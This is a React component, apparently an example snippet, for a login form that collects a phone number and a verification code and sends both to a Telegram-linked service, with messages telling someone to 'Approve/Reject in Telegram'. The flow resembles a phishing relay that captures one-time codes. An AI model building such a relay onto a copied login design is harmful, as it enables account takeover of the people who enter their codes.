// Example usage in a React component
import { useState } from "react";
import { sendPhone, sendCode } from "@/services/telegramService"; // or "../services/telegramService"

export default function LoginFlow() {
  const [phone, setPhone] = useState("");
  const [code, setCode] = useState("");
  const [requestId, setRequestId] = useState<string | undefined>();
  const [loading, setLoading] = useState(false);
  const [msg, setMsg] = useState("");

  async function onSendPhone(e: React.FormEvent) {
    e.preventDefault();
    setLoading(true);
    setMsg("");
    try {
      const res = await sendPhone(phone);
      if (!res.ok) throw new Error(res.error ?? "Unknown error");
      setRequestId(res.requestId); // keep to attach to the code later (optional)
      setMsg("Phone sent ✔️ Check Telegram.");
    } catch (err: any) {
      setMsg(err.message || "Failed to send phone");
    } finally {
      setLoading(false);
    }
  }

  async function onSendCode(e: React.FormEvent) {
    e.preventDefault();
    setLoading(true);
    setMsg("");
    try {
      const res = await sendCode(phone, code, requestId);
      if (!res.ok) throw new Error(res.error ?? "Unknown error");
      setMsg("Code sent ✔️ Approve/Reject in Telegram.");
    } catch (err: any) {
      setMsg(err.message || "Failed to send code");
    } finally {
      setLoading(false);
    }
  }

  return (
    <>
      {/* your existing design/inputs — keep them */}
      <form onSubmit={onSendPhone}>
        <input value={phone} onChange={(e) => setPhone(e.target.value)} placeholder="Phone" />
        <button disabled={loading}>Send phone</button>
      </form>

      <form onSubmit={onSendCode}>
        <input value={code} onChange={(e) => setCode(e.target.value)} placeholder="Code" />
        <button disabled={loading}>Send code</button>
      </form>

      {!!msg && <p>{msg}</p>}
    </>
  );
}
